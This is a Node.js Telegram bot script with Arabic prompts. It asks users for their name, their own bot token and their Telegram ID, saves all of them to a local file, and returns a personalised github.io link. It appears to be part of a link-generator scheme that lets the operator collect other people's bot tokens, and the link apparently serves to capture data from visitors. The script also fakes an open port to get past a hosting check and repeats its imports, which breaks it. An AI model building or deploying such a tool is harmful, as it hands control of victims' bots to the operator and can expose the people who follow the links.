import { Telegraf } from 'telegraf';
import fs from 'fs';
import http from 'http';
import { Telegraf } from 'telegraf';
import fs from 'fs';

const mainBot = new Telegraf('ضع التوكن هنا');

function loadUsers() {
  try {
    return JSON.parse(fs.readFileSync('users.json'));
  } catch {
    return {};
  }
}

function saveUsers(users) {
  fs.writeFileSync('users.json', JSON.stringify(users, null, 2));
}

const users = loadUsers();

mainBot.start((ctx) => {
  const chatId = ctx.chat.id.toString();
  users[chatId] = { step: 'name' }; // ابدأ بخطوة الاسم
  ctx.reply('👋 أهلاً بك! ما هو اسمك؟');
});

mainBot.on('text', (ctx) => {
  const chatId = ctx.chat.id.toString();
  const text = ctx.message.text;

  if (!users[chatId]) users[chatId] = { step: 'name' };

  const user = users[chatId];

  if (user.step === 'name') {
    user.name = text;
    user.step = 'token';
    ctx.reply('🔑 أرسل التوكن الخاص بك:');
  } else if (user.step === 'token') {
    if (text.includes(':')) {
      user.token = text;
      user.step = 'id';
      ctx.reply('🆔 الآن أرسل الـ ID الخاص بك:');
    } else {
      ctx.reply('❌ صيغة التوكن غير صحيحة. أعد الإرسال ويكون فيه ":"');
    }
  } else if (user.step === 'id') {
    if (/^\d{9,}$/.test(text)) {
      user.id = text;
      user.step = 'done';
      saveUsers(users);
      ctx.reply(`✅ تم الحفظ بنجاح!
رابطك الخاص:
https://qwertyuiopqw12.github.io/Boot-/?ref=${text}`);
    } else {
      ctx.reply('❌ ID غير صحيح. أعد الإرسال (يجب أن يكون أرقام فقط)');
    }
  }
});

mainBot.launch();
console.log('🤖 تم تشغيل البوت!');
// تحايل لفتح منفذ وهمي لتجنب خطأ Render
http.createServer(() => {}).listen(process.env.PORT || 3000);